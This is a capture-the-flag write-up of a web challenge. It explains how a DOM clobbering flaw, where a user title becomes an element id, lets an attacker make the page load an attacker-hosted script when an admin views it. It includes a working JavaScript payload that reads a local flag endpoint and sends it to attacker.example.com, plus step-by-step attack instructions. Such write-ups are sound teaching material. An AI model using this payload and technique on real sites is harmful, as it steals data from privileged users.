# Upload Docs &mdash; Solution

## Summary

The site allows users to submit a title and a link which are later rendered into the page. The frontend contains an obfuscated snippet that:

* Iterates over link elements and **assigns their `id` from user-supplied titles**.
* Dynamically inserts a `<script>` whose `src` is taken from `window[effects].href` if that property exists, otherwise defaults to `"static/js/effect.js"`.

Because DOM elements with an `id` are reachable from `window` as properties (`window[id]`), a malicious user can **clobber** the `window` object by creating an element whose id matches the `effects` key. That allows replacing the script source with an attacker-controlled URL. If an administrator loads the page for that user (via the `/admin?target_user=...` endpoint), the admin’s browser will execute the attacker script. The script can then fetch local-only resources (e.g. `http://127.0.0.1:5000/get_flag`) and exfiltrate the result.

## Relevant code (deobfuscated)

```javascript
var items = document.querySelectorAll('li');
items.forEach((li, index) => {
  document.querySelector('a[data-index="' + index.toString() + '"]').id =
    document.getElementsByName(index.toString())[0].innerHTML;
});

var effects = "static/js/effect.js";
let backup = [].filter.constructor("return this")();  // returns window

const { href } = backup[effects] || { href: effects };

const script = document.createElement('script');
script.src = href;
document.body.appendChild(script);
```

Key points:

* `backup` is the global object (`window`).
* `backup[effects]` checks `window["static/js/effect.js"]`.
* If present, `backup[effects].href` is used as the script URL.

## Why DOM clobbering works here

1. The server stores and later renders the **user-provided title** into the page as the `id` of an `<a>` element (via `innerHTML`).
2. Browser behavior: elements with an `id` become properties on `window` accessible as `window[id]` (and also using bracket notation `window["id"]`).
3. If you choose a title equal to the string in `effects` (`"static/js/effect.js"`), the page will set `window["static/js/effect.js"]` to that DOM element object.
4. The site uses `backup[effects] || { href: effects }` — because `backup[effects]` now exists, the code will take its `.href` property as the script URL. Since the DOM element is user-supplied, its `.href` points to the user-supplied link.
5. As a result, the page injects a `<script>` whose `src` is attacker-controlled.

## Attack flow (practical steps)

1. **Host attacker script.** Prepare a public URL that serves a small JS file (call it `fetch.js`) which:

   * Fetches `http://127.0.0.1:5000/get_flag` (a local-only endpoint reachable by the admin’s browser).
   * Sends the returned content to the attacker’s server.

   Example `fetch.js`:

   ```javascript
   fetch("http://127.0.0.1:5000/get_flag")
     .then(response => {
       if (!response.ok) {
         throw new Error(`HTTP error! Status: ${response.status}`);
       }
       return response.text();
     })
     .then(data => {
       responseData = data;
       console.log("Fetched data:", responseData);
       fetch("https://attacker.example.com?flag="+responseData);
     })
     .catch(error => {
       console.error("Fetch error:", error);
   });
   ```

2. **Create a link entry on the site** with:

   * **Title** = `static/js/effect.js`  (this becomes the element `id` and thus `window["static/js/effect.js"]`)
   * **Destination URL** = `https://attacker.example.com/fetch.js`

   After the page renders, `window["static/js/effect.js"].href` points to your hosted `fetch.js`.

3. **Trigger admin to visit** the page:

   * Use the provided `/admin?target_user={user_id}` endpoint (the challenge indicates admins will load the page for a specified `target_user`).
   * Find the `user_id` (challenge notes it is stored in a cookie) and call that endpoint so the admin’s browser opens the page containing your crafted link.

4. **Admin’s browser executes `fetch.js`** (because the site injects your script instead of the original `static/js/effect.js`). The script fetches `http://127.0.0.1:5000/get_flag` and forwards the result to your server.

5. **Attacker receives the flag.** In the challenge the flag was:

   ```
   FortID{50m371m35_15_b3773r_70_n07_v1b3_c0d3_4nd_0buf5c473}
   ```
